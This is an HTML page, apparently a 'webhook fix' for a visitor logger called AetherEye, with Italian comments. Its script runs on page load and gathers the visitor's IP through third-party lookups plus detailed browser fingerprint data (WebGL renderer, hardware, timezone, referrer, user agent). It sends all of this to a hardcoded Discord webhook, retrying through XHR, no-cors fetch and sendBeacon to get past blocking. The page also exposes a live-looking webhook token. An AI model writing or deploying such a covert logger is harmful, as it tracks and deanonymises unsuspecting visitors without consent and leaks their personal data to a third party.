<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AetherEye - Webhook Fix</title>
    <style>
        body{background:#0a0a0a;color:#fff;font-family:monospace;padding:2rem;}
        .log{background:#111;padding:1rem;border:1px solid #333;margin-top:2rem;white-space:pre-wrap;font-size:0.8rem;max-height:400px;overflow-y:auto;}
        .status{display:inline-block;padding:0.3rem 0.8rem;border-radius:4px;margin:0.5rem 0;}
        .status.success{background:#00aa44;color:#fff;}
        .status.fail{background:#cc2233;color:#fff;}
        .status.waiting{background:#ffaa00;color:#000;}
    </style>
</head>
<body>
    <h1>🔧 AetherEye - Webhook Fix</h1>
    <p>Sto testando il webhook con <strong>3 metodi</strong> diversi.</p>
    <div id="status" class="status waiting">⏳ In attesa...</div>
    <div class="log" id="log">[LOG]\n</div>

    <script>
        (function() {
            // === WEBHOOK ===
            var WEBHOOK = 'https://discord.com/api/webhooks/1534883359962959902/3egTtBT3dMC3UFdhvr07HnOYce2EeFFFjzDlE4rSdfj46kp7aEoMfFTXQlAjSMFRfCyZ';

            var logEl = document.getElementById('log');
            var statusEl = document.getElementById('status');

            function log(msg) {
                logEl.textContent += msg + '\n';
                console.log(msg);
            }

            function setStatus(text, type) {
                statusEl.textContent = text;
                statusEl.className = 'status ' + type;
            }

            // === METODO 1: XMLHttpRequest (standard) ===
            function sendWithXHR(payload) {
                return new Promise(function(resolve, reject) {
                    log('[XHR] Invio in corso...');
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', WEBHOOK, true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.onload = function() {
                        if (xhr.status === 204 || xhr.status === 200) {
                            log('[XHR] ✅ Successo! Status: ' + xhr.status);
                            resolve(true);
                        } else {
                            log('[XHR] ❌ Status: ' + xhr.status + ' - ' + xhr.statusText);
                            reject(new Error('Status ' + xhr.status));
                        }
                    };
                    xhr.onerror = function() {
                        log('[XHR] ❌ Errore di rete (CORS?)');
                        reject(new Error('Network error'));
                    };
                    xhr.send(JSON.stringify(payload));
                });
            }

            // === METODO 2: Fetch API (con keepalive) ===
            function sendWithFetch(payload) {
                return new Promise(function(resolve, reject) {
                    log('[FETCH] Invio in corso...');
                    fetch(WEBHOOK, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload),
                        keepalive: true,
                        mode: 'no-cors' // <- bypassa CORS (ma non ricevi risposta)
                    }).then(function(response) {
                        // Con 'no-cors' la risposta è opaca, ma se non dà errore probabilmente è partita
                        log('[FETCH] Richiesta inviata (modalità no-cors)');
                        resolve(true);
                    }).catch(function(err) {
                        log('[FETCH] ❌ Errore: ' + err.message);
                        reject(err);
                    });
                });
            }

            // === METODO 3: Image Beacon (ultima spiaggia) ===
            function sendWithBeacon(payload) {
                return new Promise(function(resolve, reject) {
                    log('[BEACON] Invio in corso...');
                    try {
                        var blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
                        var sent = navigator.sendBeacon(WEBHOOK, blob);
                        if (sent) {
                            log('[BEACON] ✅ Inviato con successo!');
                            resolve(true);
                        } else {
                            log('[BEACON] ❌ sendBeacon ha fallito');
                            reject(new Error('sendBeacon failed'));
                        }
                    } catch(e) {
                        log('[BEACON] ❌ Errore: ' + e.message);
                        reject(e);
                    }
                });
            }

            // === Costruisce il payload ===
            function buildPayload(ip) {
                var data = {
                    platform: navigator.platform || 'unknown',
                    language: navigator.language || 'unknown',
                    screen: screen.width + 'x' + screen.height,
                    colorDepth: screen.colorDepth || 'unknown',
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
                    referrer: document.referrer || 'direct',
                    url: window.location.href,
                    userAgent: navigator.userAgent || 'unknown',
                    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown',
                    cpuCores: navigator.hardwareConcurrency || 'unknown',
                    touchPoints: navigator.maxTouchPoints || 0,
                    cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No'
                };

                // WebGL
                try {
                    var canvas = document.createElement('canvas');
                    var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        if (debugInfo) {
                            data.webgl = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) + ' | ' + 
                                         gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                        }
                    }
                } catch(e) { data.webgl = 'n/a'; }

                // Connection
                if (navigator.connection) {
                    var conn = navigator.connection;
                    data.connection = (conn.effectiveType || '') + ' (' + (conn.downlink || '?') + ' Mbps)';
                } else {
                    data.connection = 'n/a';
                }

                return {
                    content: null,
                    embeds: [{
                        title: '🌐 **Full Visitor Profile**',
                        color: 0x00ff88,
                        fields: [
                            { name: '📡 IP', value: '`' + ip + '`', inline: true },
                            { name: '🖥️ Platform', value: data.platform, inline: true },
                            { name: '🌍 Language', value: data.language, inline: true },
                            { name: '📱 Screen', value: data.screen, inline: true },
                            { name: '🎨 Color Depth', value: data.colorDepth + ' bit', inline: true },
                            { name: '🕐 Timezone', value: data.timezone, inline: true },
                            { name: '🔗 Referrer', value: data.referrer, inline: false },
                            { name: '📍 URL', value: data.url, inline: false },
                            { name: '🧠 RAM', value: data.deviceMemory, inline: true },
                            { name: '⚙️ CPU Cores', value: data.cpuCores, inline: true },
                            { name: '🖱️ Touch', value: data.touchPoints + ' points', inline: true },
                            { name: '🍪 Cookies', value: data.cookiesEnabled, inline: true },
                            { name: '🎮 WebGL', value: data.webgl || 'n/a', inline: false },
                            { name: '📶 Connection', value: data.connection, inline: false },
                            { name: '🛡️ User Agent', value: '```' + data.userAgent.substring(0, 200) + '```', inline: false }
                        ],
                        footer: { text: 'AetherEye Logger • ' + new Date().toUTCString() },
                        timestamp: new Date().toISOString()
                    }]
                };
            }

            // === Ottiene IP ===
            function getIP(callback) {
                log('[IP] Richiesta a api.ipify.org...');
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'https://api.ipify.org?format=json', true);
                xhr.onload = function() {
                    if (xhr.status === 200) {
                        var data = JSON.parse(xhr.responseText);
                        log('[IP] ✅ ' + data.ip);
                        callback(data.ip);
                    } else {
                        log('[IP] Fallback a ipapi.co...');
                        var xhr2 = new XMLHttpRequest();
                        xhr2.open('GET', 'https://ipapi.co/json/', true);
                        xhr2.onload = function() {
                            if (xhr2.status === 200) {
                                var data2 = JSON.parse(xhr2.responseText);
                                log('[IP] ✅ ' + data2.ip);
                                callback(data2.ip || 'unknown');
                            } else {
                                log('[IP] ❌ Tutti i fallback falliti, uso "unknown"');
                                callback('unknown');
                            }
                        };
                        xhr2.onerror = function() {
                            log('[IP] ❌ Fallback fallito');
                            callback('unknown');
                        };
                        xhr2.send();
                    }
                };
                xhr.onerror = function() {
                    log('[IP] ❌ api.ipify.org non risponde');
                    callback('unknown');
                };
                xhr.send();
            }

            // === ESECUZIONE ===
            setStatus('⏳ Acquisizione IP...', 'waiting');

            getIP(function(ip) {
                var payload = buildPayload(ip);
                log('[PAYLOAD] Costruito.');

                setStatus('📤 Invio in corso...', 'waiting');

                // Prova i 3 metodi in sequenza
                sendWithXHR(payload)
                    .then(function() {
                        setStatus('✅ Inviato con XHR!', 'success');
                        log('[OK] Webhook funzionante.');
                    })
                    .catch(function() {
                        log('[WARN] XHR fallito, provo Fetch...');
                        return sendWithFetch(payload);
                    })
                    .then(function() {
                        setStatus('✅ Inviato con Fetch!', 'success');
                        log('[OK] Webhook funzionante (Fetch).');
                    })
                    .catch(function() {
                        log('[WARN] Fetch fallito, provo Beacon...');
                        return sendWithBeacon(payload);
                    })
                    .then(function() {
                        setStatus('✅ Inviato con Beacon!', 'success');
                        log('[OK] Webhook funzionante (Beacon).');
                    })
                    .catch(function(err) {
                        setStatus('❌ Tutti i metodi falliti', 'fail');
                        log('[ERRORE] ' + err.message);
                        log('[SUGGERIMENTO] Prova a:\n' +
                            '1. Disabilitare AdBlock/uBlock\n' +
                            '2. Usare un server web (python -m http.server)\n' +
                            '3. Provare da un altro browser\n' +
                            '4. Verificare che il webhook sia attivo');
                    });
            });

        })();
    </script>
</body>
</html>
